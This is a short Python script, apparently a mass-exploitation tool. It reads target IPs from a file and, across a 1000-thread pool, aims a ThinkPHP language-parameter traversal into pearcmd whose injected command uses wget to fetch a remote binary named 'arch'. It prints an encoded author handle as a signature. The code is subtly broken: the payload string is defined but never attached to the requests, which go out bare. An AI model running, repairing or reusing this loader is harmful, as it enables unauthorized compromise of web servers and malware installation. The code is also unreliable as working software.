import requests
from concurrent.futures import ThreadPoolExecutor
import urllib3
import sys
import os
import vthread
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
requests.packages.urllib3.disable_warnings()

header= {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
"Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
"Accept-Encoding": "gzip, deflate",
"RESOVLER":"Resolver"

}



cmd = "wget 0.0.0.0/arch"
binarry = "\x40\x52\x65\x53\x6f\x4c\x76\x65\x52\x5f\x6f\x66\x66\x69\x63\x69\x61\x6c"
payload = "/index.php?s=index/index/index/think_lang/../../extend/pearcmd/pearcmd/index&cmd="+cmd
@vthread.pool(1000)
def main(url):
    if "http" not in url:
        url = "http://" +url
    try:
        r = requests.get(url,verify=False,timeout=20,headers=header)
        if r.status_code == 200:
            print("SENT SUCCESSFULLY!",binarry)
        else:
            print("CONNECTION REFUSED",binarry)
    except:
        print("SOMETHING WENT WRONG",binarry)

print(binarry)

ip = open(sys.argv[1]).readlines()

for i in ip:
    main(i)



